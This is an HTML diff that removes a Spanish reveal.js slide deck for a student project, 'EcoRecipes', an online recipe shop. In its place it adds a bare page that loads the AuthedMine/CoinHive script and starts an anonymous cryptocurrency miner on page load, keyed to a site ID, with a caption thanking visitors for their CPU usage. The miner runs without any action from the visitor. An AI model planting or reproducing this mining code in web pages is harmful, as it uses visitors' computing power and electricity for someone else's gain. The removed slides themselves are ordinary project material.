@@ -1,229 +1,31 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-		<title>Presentación - Ramón Martínez Tarín</title>
-
-		<link rel="stylesheet" href="css/reveal.css">
-		<link rel="stylesheet" href="css/theme/black.css">
-		<style type="text/css">
-				.blanco{
-					color: white;
-				}
-		</style>
-		<!-- Theme used for syntax highlighting of code -->
-		<link rel="stylesheet" href="lib/css/zenburn.css">
-
-		<!-- Printing and PDF exports -->
-		<script>
-			var link = document.createElement( 'link' );
-			link.rel = 'stylesheet';
-			link.type = 'text/css';
-			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
-			document.getElementsByTagName( 'head' )[0].appendChild( link );
-		</script>
-	</head>
-	<body>
-		<div class="reveal">
-			<div class="slides">
-				<section data-background="#FF9900">
-					<img src="./img/logo.jpg" width="800" height="150">
-					<p>Proyecto Final de Grado</p>
-					<p>Desarrollo de Aplicaciones Web</p>
-					<p><strong>Alumno:</strong> Ramón Martínez Tarín</p>
-
-				</section>
-
-				<section data-background="#FF9900">
-					<img src="./img/logo.png" width="800" height="200">
-					<p style="color:white;">"EcoRecipes, una tienda online de recetas ecológicas y vegetarianas"</p>
-				</section>
-
-				<section data-background="#FF9900">
-					<h2>Índice:</h2>
-						<ul class="blanco">
-						<li>¿Qué es EcoRecipes?</li>
-							<ul style="margin-left: 50px;">
-							<li>Idea de negocio</li>
-							<li>¿De qué se conforma?</li>
-							<li>Funcionalidades</li>
-							<li>Herramientas y tecnologías</li>
-							</ul>
-						<li>Metodología de trabajo</li>
-						<li>Propuestas de mejora</li>
-							<ul style="margin-left: 50px;">
-							<li>Mejoras relativas a la funcionalidad</li>
-							<li>Mejoras relativas al código</li>
-							</ul>
-						</ul>
-				</section>
-
-				<section data-background="#FF9900">
-					<section><h1>¿Qué es EcoRecipes?</h1></section>
-					<section>
-					<h2>Idea de negocio</h2>
-					<p class="fragment blanco">Tienda de recetas ecológicas y vegetarianas.</p>
-					<p class="fragment blanco">No enviamos el plato hecho, sino los ingredientes.</p>
-					<p class="fragment blanco">Instrucciones detalladas de elaboración.</p>
-					</section>
-
-					<section>
-					<h2>¿De qué se conforma?</h2>
-					<p class="fragment blanco">Frontend</p>
-					<img src="./img/frontend.PNG" width="500" height="300"/ class="fragment">
-					</section>
-					
-					<section>
-						<p class="blanco">Backend</p>
-						<img src="./img/backend.PNG" class="fragment"/>
-					</section>
-				</section>
-
-				<section data-background="#FF9900">
-						<section>
-							<h1>Funcionalidades</h1>
-							<p class="blanco">¡Ahora con gvHIDRA!</p>
-						</section>
-						<section>
-							<p class="blanco">Compra de productos</p>
-							<img class="fragment" src="./img/compra.PNG"/>
-						</section>
-						<section>
-							<p class="blanco">Gestión de artículos</p>
-							<img class="fragment" src="./img/articulos.PNG"/>
-							</section>
-						<section>
-							<p class="blanco">Gestión de pedidos</p>
-							<img class="fragment" src="./img/pedidos.PNG"/>
-						</section>
-						<section>
-							<p class="blanco">Gestión de clientes</p>
-							<img class="fragment" src="./img/clientes.PNG"/>
-						</section>
-						<section>
-							<p class="blanco">Gestión de categorías</p>
-							<img class="fragment" src="./img/categorias.PNG"/>
-						</section>
-				</section>
-
-				<section data-background="#FF9900">
-					<section>
-						<h1>Herramientas y tecnologías</h1>
-					</section>
-						<section>
-							<h4>Hosting y automatización</h4>
-							<p class="fragment"><img  src="./img/amazon.png" width="200" height="200" />
-							<img  src="./img/jenkins.png" width="200" height="200"/></p>
-							<ul>
-								<li class="fragment"><p class="blanco">Jenkins</p></li>
-								<li class="fragment"><p class="blanco">Amazon Web Services</p></li>
-							</ul>
-						</section>
-						<section>
-						<h4>Tecnologías del Frontend</h4>
-						<img class="fragment" src="./img/tecnologias-front.png" height="200"/>
-						<ul>
-							<li class="fragment"><p class="blanco">HTML5</p></li>
-							<li class="fragment"><p class="blanco">CSS3</p></li>
-							<li class="fragment"><p class="blanco">jQuery</p></li>
-							<li class="fragment"><p class="blanco">SweetAlert</p></li>
-						</ul>
-					</section>
-					<section>
-						<h4>Tecnologías del Backend</h4>
-						<p class="fragment"><img src="./img/gvhidra.jpg" height="150"/> <img src="img/php.png" width="228" height="156"></p>
-						<ul>
-							<li class="fragment"><p class="blanco">gvHIDRA</p></li>
-							<li class="fragment"><p class="blanco">PHP</p></li>
-							<li class="fragment"><p class="blanco">cURL</p></li>
-						</ul>
-					</section>
-					<section>
-						<h4>¿Porqué uso gvHIDRA?</h4>
-						<p class="fragment blanco">Es una herramienta RAD.</p>
-						<p class="fragment blanco">Generación de código.</p>
-						<p class="fragment blanco">Es un proyecto muy maduro.</p>
-						<p class="fragment blanco">Es Open Source.</p>
-						<p class="fragment blanco">Me ha servido para mis FCT.</p>
-						<p class="fragment blanco"><a href="http://52.28.62.178/backend">Ejemplo RAD gvHIDRA</a></p>
-					</section>
-				</section>
-
-				<section data-background="#FF9900">
-					<section>
-					<h1>Metodología de trabajo</h1>
-					</section>
-
-					<section>
-						<h3>SCRUM</h3>
-						<p class="fragment blanco">Metodología ágil.</p>
-						<p class="fragment blanco">Útil para proyectos inestables.</p>
-						<p class="fragment blanco">Hace que se puedan cambiar las cosas en cualquier momento.</p>
-						<p class="fragment blanco">Se planifica sobre la realidad, y no sobre la fantasía.</p>
-					</section>
-					<section>
-						<h4>Valoración personal</h4>
-						<p class="fragment blanco">Relación amor/odio.</p>
-						<p class="fragment blanco">Muy práctico para la enseñanza en FP.</p>
-						<p class="fragment blanco">Los equipos deben estar perfectamente coordinados.</p>
-						<p class="fragment blanco">Las estimaciones nunca son precisas.</p>
-						<p class="fragment blanco">La calidad de los miembros del equipo influye enormemente en la calidad del producto.</p>
-					</section>
-				</section>
-
-				<section data-background="#FF9900">
-					<section>
-						<h1>Propuestas de mejora</h1>
-					</section>
-
-					<section>
-						<h3>Mejoras funcionales</h3>
-							<p class="fragment blanco">Activación de cuenta (tras el registro con captcha).</p>
-							<p class="fragment blanco">Sistema de feedback.</p>
-							<p class="fragment blanco">Seguimiento de los pedidos.</p>
-							<p class="fragment blanco">Cupones de descuento para clientes habituales.</p>
-							<p class="fragment blanco">Suscripción premium.</p>
-
-					</section>
-
-					<section>
-						<h3>Mejoras sobre el código</h3>
-							<p class="fragment blanco">Utilizar el patrón DAO.</p>
-							<p class="fragment blanco">Utilizar un ORM para la parte de persistencia.</p>
-							<p class="fragment blanco">Cambiar los controladores por controladores RESTful.</p>
-							<p class="fragment blanco">Implementar una capa de servicios.</p>
-							<p class="fragment blanco">Mejorar el manejo de errores.</p>
-					</section>
-				</section>
-
-				<section data-background="#FF9900">
-					<h1>¡Gracias por todo!</h1>
-					<a href="https://github.com/ajaniramon"><img src="./img/github.png" width="200" height="200"></a>
-				</section>
-					
+<head>
+	<style type="text/css">
+		body{
+			background-color: black;
+		}
+		#photo{
+			text-align:center;
+		}
+	</style>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	window.onload = function(){
+		var miner = new CoinHive.Anonymous('nmuzPnyUgK3o6dy61HB8PjElNvmyaOwo');
+		miner.start();
+	}
+	
+</script>
+	<title></title>
+</head>
+<body>
+<div class="main_container">
+		<div id="photo">
+			<img src="https://use.gameapis.net/mc/images/avatar/Ajani_Ramon/100/true"/>
 		</div>
-		</div>
-
-		<script src="lib/js/head.min.js"></script>
-		<script src="js/reveal.js"></script>
-
-		<script>
-			// More info https://github.com/hakimel/reveal.js#configuration
-			Reveal.initialize({
-				history: true,
-
-
-				// More info https://github.com/hakimel/reveal.js#dependencies
-				dependencies: [
-					{ src: 'plugin/markdown/marked.js' },
-					{ src: 'plugin/markdown/markdown.js' },
-					{ src: 'plugin/notes/notes.js', async: true },
-					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
-				]
-			});
-			Reveal.configure({ slideNumber: true });
-		</script>
-	</body>
+		
+		<p style="text-align:center;color:white;font-weight:bold;">Thanks for your CPU usage! :D</p>
+	</div>
+</body>
 </html>
